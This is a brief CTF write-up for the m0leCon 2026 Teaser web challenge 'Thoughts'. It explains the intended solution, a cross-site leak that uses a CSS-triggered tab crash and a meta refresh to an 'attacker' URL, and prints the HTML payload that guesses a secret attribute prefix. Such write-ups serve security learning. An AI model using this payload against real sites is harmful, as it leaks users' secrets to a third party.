# m0leCon CTF 2026 Teaser

## [web] Thoughts (9 solves)

Share your thoughts!

Author: Sebastiano Sartor <@sebsrt>

## Solution

Unfortunately the challenge was put up too quickly and was not properly tested, enabling solutions such as: https://gist.github.com/terjanq/3e866293610aa6c5629df4353e5d87d9

Intended solution:

TLDR:
XS Leak using css contidional tab crash + meta redirect

```html
<style>
    :where(body[secret^="GUESS"]) .z {float: inline-start;  }
    * {text-wrap: pretty; }
</style><a>1</p><dir><legend class="z"></legend><details>
<meta http-equiv="refresh" content="0; URL='attacker'" />
```

if the tab crashes when the condition is matched, the redirect doesn't happen.

## Exploit

[here](m0lecon-2026-teaser/thoughts/solve)